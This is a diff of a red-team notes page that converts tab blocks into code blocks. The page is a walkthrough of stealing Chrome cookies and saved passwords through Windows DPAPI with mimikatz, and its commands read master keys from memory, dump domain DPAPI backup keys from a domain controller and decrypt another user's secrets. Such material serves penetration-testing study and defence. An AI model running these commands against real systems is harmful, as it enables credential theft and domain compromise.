@@ -18,25 +18,21 @@ If you have compromised as system and run under a particular user's context, you
 
 In this case - let's check user's Google Chrome cookies for a currently logged on user:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-13-15-31-49.png)
 
 Or Chrome's saved credentials:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-13-15-34-29.png)
 
@@ -44,13 +40,11 @@ dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /u
 
 Using mimikatz, we can easily encrypt any data that will only be accessible to currently logged on user \(unless a bad admin comes by - more on this later\):
 
-{% tabs %}
-{% tab title="" %}
+{% code title="" %}
 ```csharp
 dpapi::protect /data:"spotless"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![text &quot;spotless&quot; encrypted into a blob of bytes](../../.gitbook/assets/screenshot-from-2019-04-13-15-42-36.png)
 
@@ -68,13 +62,11 @@ If you compromised a system and you see that there are other users on the system
 
 Let's try reading user's `spotless` chrome secrets while running as a local admin:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 As mentioned, we see an error message suggesting `CryptUnprotectData` is having some issues decrypting the requested secrets:
 
@@ -82,13 +74,11 @@ As mentioned, we see an error message suggesting `CryptUnprotectData` is having 
 
 If you escalated privilges, you can try looking for the master key in memory:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```text
 sekurlsa::dpapi
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 We see there is the master key for user `spotless`:
 
@@ -96,13 +86,11 @@ We see there is the master key for user `spotless`:
 
 Let's now use that master key for `spotless` to decrypt those Chrome secrets we could not earlier:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-13-16-05-55.png)
 
@@ -112,13 +100,11 @@ Additionally, note that if the user is not logged on, but you have their passwor
 
 Same could be achieved if user's SID, their logon password and master key's GUIDs are known:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-13-18-02-42.png)
 
@@ -128,37 +114,31 @@ It's possible to extract DPAPI backup keys from the Domain Controller that will 
 
 While running as a `Domain Admin`, let's dump the DPAPI backup keys:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 lsadump::backupkeys /system:dc01.offense.local /export
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-13-16-57-55.png)
 
 Using the retrieved backup key, let's decrypt user's `spotless` master key:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-13-17-11-48.png)
 
 We can now decrypt user's `spotless` chrome secrets using their decrypted master key:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-13-17-16-47.png)
 
@@ -207,13 +187,11 @@ dpapi::blob /in:"c:\users\mantvydas\desktop\encrypted.bin" /unprotect
 
 We can see the decryption produced the following output:
 
-{% tabs %}
-{% tab title="decryptedBlob" %}
+{% code title="decryptedBlob" %}
 ```csharp
 73 70 6f 74 6c 65 73 73 00
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ...which is `spotless`, represented in bytes.
 
